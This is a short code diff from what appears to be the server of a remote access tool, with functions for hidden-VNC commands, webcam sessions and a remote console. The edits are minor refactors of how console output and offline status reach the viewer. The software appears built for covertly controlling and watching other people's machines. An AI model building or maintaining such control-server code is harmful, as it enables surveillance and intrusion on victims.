@@ -1181,8 +1181,6 @@ export function sendHVNCCommand(target: ClientInfo, commandType: string, payload
   return broadcastFrameToViewers(sessionManager.getWebcamSessionsForClient(clientId), buf, header);
 };
 
-const textDecoder = new TextDecoder();
-
 export function handleConsoleViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
   const payload = decodeViewerPayload(raw);
   if (!payload) return;
@@ -1193,7 +1191,6 @@ export function handleConsoleViewerMessage(ws: ServerWebSocket<SocketData>, raw:
   const { clientId, sessionId } = ws.data;
   const target = clientManager.getClient(clientId);
   if (!target) {
-    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
     return;
   }
 
@@ -1225,11 +1222,10 @@ export function handleConsoleOutput(clientId: string, payload: any) {
   const session = sessionManager.getConsoleSession(sessionId);
   if (!session) return;
   if (session.clientId !== clientId) return;
-  const data = payload.data ? textDecoder.decode(payload.data as Uint8Array) : "";
   safeSendViewer(session.viewer, {
     type: "output",
     sessionId,
-    data,
+    data: payload.data ?? null,
     exitCode: payload.exitCode,
     error: payload.error,
   });
